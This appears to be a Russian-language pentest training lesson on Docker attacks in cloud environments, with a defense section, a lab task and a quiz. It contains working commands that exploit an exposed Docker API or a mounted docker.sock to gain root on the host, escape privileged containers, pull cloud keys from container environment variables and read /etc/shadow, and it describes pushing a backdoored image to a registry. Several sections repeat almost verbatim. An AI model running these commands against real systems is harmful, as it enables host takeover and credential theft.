---
id: cloud-containers-docker
title: "Docker в облаке: открытый демон, привилегированные контейнеры и escape"
category: cloud
parent: cloud-foundations-services
difficulty: hard
order: 2
tags: [cloud, docker, containers, escape, privileged, registry]
prerequisites: [cloud-fundamentals]
useful_for:
  - "Эксплуатация открытого Docker API"
  - "Escape из контейнера на хост"
  - "CTF и пентест контейнерных сред"
estimated_minutes: 50
summary: "Контейнеры — основа облачных ворклоадов. Разбираем открытый Docker-демон (2375/2376), привилегированные контейнеры, монтирование docker.sock, техники escape и утечки через registry."
---

Контейнер — это не граница безопасности, а упаковка процесса. В облаке контейнеры повсюду: от CI до продакшена. Если демон открыт или контейнер привилегирован, граница рушится и вы получаете хост. Урок про то, как это происходит на практике.

## Что такое контейнер и почему он «не песочница»

Docker использует namespaces (изоляция видимости) и cgroups (лимиты ресурсов), но **общее ядро** с хостом. Отсюда следствия:

- Монтирование `docker.sock` внутри контейнера = управление демоном хоста.
- `--privileged` = почти все capabilities + доступ к устройствам.
- `--pid=host`/`--net=host` = видимость процессов/сети хоста.
- Запись в смонтированный хост-путь = изменение файлов хоста.

## Открытый Docker-демон: 2375/2376

Демон по умолчанию слушает unix-socket, но часто его выставляют в TCP (2375 без TLS, 2376 с TLS). Открытый 2375 — это root на хосте.

```bash
# Обнаружение
nmap -Pn -p 2375,2376 --open <CIDR>
curl -s http://<host>:2375/version
curl -s http://<host>:2375/containers/json

# Перечисление через API
curl -s http://<host>:2375/images/json | jq -r '.[].RepoTags[]'
curl -s http://<host>:2375/containers/json | jq -r '.[].Names[]'

# Запуск контейнера с монтированием корня хоста (RCE на хост)
curl -s -X POST http://<host>:2375/containers/create?name=pwn \
  -H 'Content-Type: application/json' -d '{
    "Image":"alpine","Cmd":["/bin/sh","-c","chroot /host /bin/sh -c id"],
    "Binds":["/:/host"],"Privileged":true}'
curl -s -X POST http://<host>:2375/containers/pwn/start
curl -s http://<host>:2375/containers/pwn/logs?stdout=1
```

Если есть `docker` CLI и переменная `DOCKER_HOST`:

```bash
export DOCKER_HOST=tcp://<host>:2375
docker ps
docker run -v /:/host --privileged -it alpine chroot /host /bin/sh
```

## docker.sock внутри контейнера

Частая ошибка — смонтировать `/var/run/docker.sock` в контейнер (например, для CI-агента). Это даёт контейнеру управление демоном:

```bash
# Внутри такого контейнера
ls -la /var/run/docker.sock
# Если есть docker CLI:
docker -H unix:///var/run/docker.sock run -v /:/host --privileged -it alpine chroot /host
# Без CLI — напрямую через сокет
curl --unix-socket /var/run/docker.sock http://localhost/version
```

## Побег из привилегированного контейнера

Даже без демона привилегированный контейнер можно «вывернуть» на хост:

```bash
# Вариант 1: nsenter через hostPID
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh

# Вариант 2: chroot в смонтированный корень
mkdir -p /mnt/host && mount /dev/sda1 /mnt/host && chroot /mnt/host /bin/sh

# Вариант 3: cgroup release_agent (если cgroup v1 и privileged)
# Вариант 4: монтирование /proc хоста и доступ к его окружению

# Проверка, привилегирован ли контейнер
capsh --print | grep -i cap_sys_admin
cat /proc/1/cgroup   # признаки контейнера
```

## Разобранный пример: от открытого registry к хосту

**Дано:** найден открытый Docker API на `10.0.0.5:2375`.

1. Перечисляем образы и контейнеры:

```bash
curl -s http://10.0.0.5:2375/containers/json | jq -r '.[] | .Names[0] + " " + .Image'
```

2. Среди контейнеров — CI-агент с переменными окружения. Читаем его env через API:

```bash
curl -s http://10.0.0.5:2375/containers/json | jq -r '.[0].Id' > id
curl -s http://10.0.0.5:2375/containers/$(cat id)/json | jq '.Config.Env'
```

3. Находим `AWS_SECRET_ACCESS_KEY` и токены. Проверяем:

```bash
aws sts get-caller-identity
```

4. Для полного контроля хоста — запускаем privileged-контейнер с монтированием `/` (команда выше) и читаем `/etc/shadow`, `~/.ssh`, kubeconfig.

## Утечки через registry

Container registry — тоже цель:

```bash
# Открытый registry API (v2)
curl -s https://<registry>/v2/_catalog
curl -s https://<registry>/v2/<image>/tags/list

# Скачать образ и поискать секреты в слоях
skopeo copy docker://<registry>/<image>:<tag> dir:./img
# или
docker pull <registry>/<image>:<tag>
docker save <image> -o img.tar && tar xf img.tar
# искать в слоях: env, .npmrc, ключи
```

Секреты в образах — классика: ключи в `ENV`, `.git`, `id_rsa`, строки подключения. Подробнее — `cloud-artifact-registry`.

## Частые ошибки

- **Считать контейнер песочницей.** Общее ядро → escape реален.
- **Забывать про TLS на 2376.** 2375 — открытый; 2376 требует клиентский сертификат, но часто настроен слабо.
- **Игнорировать env контейнеров.** Там креды, видимые через API.
- **Не проверять `docker.sock`.** Он может быть смонтирован в ваш же контейнер.
- **Путать `--privileged` и capabilities.** Достаточно `CAP_SYS_ADMIN` для части трюков.
- **Скачивать образы без анализа слоёв.** Секреты остаются в истории слоёв.

## Что дальше / решение

- Открыт 2375 → немедленно к хосту через privileged-контейнер.
- Есть `docker.sock` → то же, что открытый демон.
- Контейнер привилегирован → nsenter/mount/chroot.
- Нужен k8s → смотрите `cloud-kubernetes-rbac`, `cloud-kubernetes-escape`.

## Docker API и открытый демон

Порт 2375 (HTTP) / 2376 (HTTPS) — управление демоном по сети. Проверка:

```bash
curl -s http://TARGET:2375/version
curl -s http://TARGET:2375/containers/json | jq '.[].Names'
docker -H tcp://TARGET:2375 ps
docker -H tcp://TARGET:2375 run -v /:/host --privileged -it alpine chroot /host sh
```

Если порт открыт без TLS — вы root на хосте. Внутри контейнера проверьте `/var/run/docker.sock` — смонтированный сокет даёт тот же результат локально.

## Побег из привилегированного контейнера

```bash
capsh --print | grep cap_sys_admin
mount /dev/sda1 /mnt && chroot /mnt sh
nsenter -t 1 -m -u -i -n -p -- sh
```

## Разобранный пример: registry → хост

1. Находим открытый registry (`curl -s http://TARGET:5000/v2/_catalog`).
2. Скачиваем образы, ищем секреты в слоях.
3. Если есть push — публикуем отравленный образ.
4. Пайплайн/кластер разворачивает его → backdoor.

## Практическое задание

Разверните Docker с открытым TCP-демоном, добейтесь root через bind-mount `/`. Затем переключите демон на unix-socket и проверьте, что доступ пропал. Отработайте и атаку, и защиту.

## Побег из privileged: два пути

Первый — через устройства: `mount /dev/sda1` или `chroot` в хост. Второй — через namespaces: `nsenter -t 1 --all`. Оба требуют `CAP_SYS_ADMIN` или `--privileged`. Проверьте `capsh --print` и `cat /proc/self/status | grep CapEff`: если `CapEff` содержит `cap_sys_admin`, побег возможен.

```bash
nsenter -t 1 -m -u -i -n -p -- sh
cat /etc/shadow | head -2
```

## Защита

- Не использовать `--privileged` и `--cap-add SYS_ADMIN`.
- Не монтировать `docker.sock` и `/` внутрь.
- Rootless Docker, user namespaces.
- Seccomp/AppArmor по умолчанию.
- Runtime-мониторинг (Falco) и аудит Docker API.

## Итог

Контейнер — не граница безопасности. Открытый демон, привилегированный контейнер, смонтированный сокет и отравленный образ — четыре пути к хосту и облаку. Проверяйте их системно: порт, capabilities, mounts, registry. Для защиты — unix-socket, rootless, seccomp, подписи образов и runtime-мониторинг.

## Замечание о порядке проверки

Сначала убедитесь, что перед вами действительно открытый демон, а не honeypot: ответ `/version` должен содержать `ApiVersion` и `Os`. Только затем переходите к контейнерам. Honeypot-демоны часто отвечают шаблонно и не позволяют создать контейнер — это признак подмены.

## Сравнение с Kubernetes-побегом

Docker-побег и K8s-побег похожи (privileged, hostPath, docker.sock), но в K8s добавляется слой RBAC и admission. Docker-демон на хосте — это «нижний» уровень; в K8s вы часто сначала обходите admission, затем используете те же примитивы. Понимание обоих контекстов ускоряет оценку.

## Квиз

```quiz
- question: "Что даёт открытый Docker-демон на порту 2375?"
  options:
    - "Управление Docker на хосте, фактически root-доступ"
    - "Только чтение логов"
    - "Только метрики"
    - "Ничего без пароля"
  answer: 0
  explanation: "Docker API без аутентификации = контроль хоста."
- question: "Чем опасен смонтированный внутрь контейнера docker.sock?"
  options:
    - "Даёт управление демоном хоста и побег"
    - "Ускоряет сборку"
    - "Шифрует данные"
    - "Он безвреден"
  answer: 0
  explanation: "Через сокет запускается привилегированный контейнер."
- question: "Почему контейнер не является полноценной песочницей?"
  options:
    - "Он делит ядро с хостом"
    - "У него нет сети"
    - "У него нет файлов"
    - "Он всегда привилегирован"
  answer: 0
  explanation: "Namespaces изолируют видимость, но не ядро."
- question: "Какой флаг контейнера даёт почти все capabilities и доступ к устройствам?"
  options:
    - "--privileged"
    - "--rm"
    - "--detach"
    - "--name"
  answer: 0
  explanation: "--privileged снимает большинство ограничений."
- question: "Где в контейнере часто лежат облачные креды, видимые через Docker API?"
  options:
    - "В переменных окружения (Config.Env)"
    - "В имени образа"
    - "В теге"
    - "В порту"
  answer: 0
  explanation: "Env-переменные видны в inspect контейнера."
```

## Где пригодится

- **Пентест:** эксплуатация открытых Docker API и escape.
- **CTF:** контейнерные задачи с побегом на хост.
- **Red team:** от контейнера к облачным кредам.
- **Работа:** аудит docker.sock, privileged-контейнеров, registry.
- **Дальше по дереву:** `cloud-docker-socket`, `cloud-kubernetes-rbac`, `cloud-artifact-registry`.
